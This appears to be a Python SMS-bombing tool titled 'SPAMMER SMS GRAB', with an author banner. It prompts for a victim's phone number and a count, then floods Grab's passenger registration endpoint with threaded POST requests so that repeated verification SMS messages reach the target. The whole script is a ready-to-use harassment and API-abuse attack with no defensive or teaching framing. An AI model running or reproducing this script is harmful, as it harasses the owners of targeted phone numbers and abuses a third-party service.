#!/bin/usr/python

from multiprocessing.pool import ThreadPool
import os, random
from time import sleep as turu
import subprocess as sp
import requests

os.system('clear')
print ("""\033[1;35m
                                  -----------------------------------------
	--------------------      |        AUTHOR: TAUFIQ HAKIM           |
	| SPAMMER SMS GRAB |      |     GITHUB: https://github.com/tfqhkm |
	--------------------      |  INSTAGRAM: tfqhkm._                  |
	    ||  ||___________\033[1;33m ---------------------• ----------------------
	    ||  ||___________\033[1;33m | SERVER PM ONLY !!! |
	 -------------       \033[1;33m ----------------------
	 | UNLIMITED |
	 -------------

""")

try:
	no = input("\033[1;32m[-] NUMBER (USE 601) ->>\033[1;35m ")
	jum=int(input("\033[1;32m[+] AMOUNT ->> \033[1;35m"))
except KeyboardInterrupt:
	print("\nKey interrupt")
	exit()
print()
print("[%] RESULTS:")
def main(arg):
	try:
		idk=('phoneNumber')
		r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':no, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
#		print(r.text)
		if str(idk) in str(r.text):
			print("\033[1;32m[+] WORK")
		else:
			print("\033[1;31m[-] FAIL")
	except: pass

jobs = []
for x in range(jum):
    jobs.append(x)
p=ThreadPool(5)
p.map(main,jobs)
print("THANK YOU")
